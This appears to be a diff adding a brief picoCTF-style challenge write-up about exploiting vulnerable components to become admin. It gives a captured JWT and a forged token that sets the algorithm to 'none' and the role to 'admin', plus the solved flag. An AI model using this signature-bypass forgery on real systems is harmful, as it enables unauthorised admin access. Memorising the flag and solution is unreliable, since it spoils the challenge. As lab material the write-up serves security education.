@@ -1,0 +1,13 @@
+Most web application developers use third party components without testing their security. Some of the past affected companies are:
+Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
+Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
+VerticalScope (internet media company) - outdated version of vBulletin forum software used
+Can you identify the components and exploit the vulnerable one?
+The website is running here. Can you become an admin?
+You can login as test with the password Test123! to get started.
+
+token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjY3Mjk4ODEwNjExLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjY3Mjk4ODExfQ.uJDQYFGiqbhPrcAr9QPlCS7catX7SwWc-U0JKcSUT3Y
+
+payload: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjY3Mjk4ODEwNjExLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDYuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY2NzI5ODgxMX0.
+
+picoCTF{succ3ss_@u7h3nt1c@710n_bc6d9041}
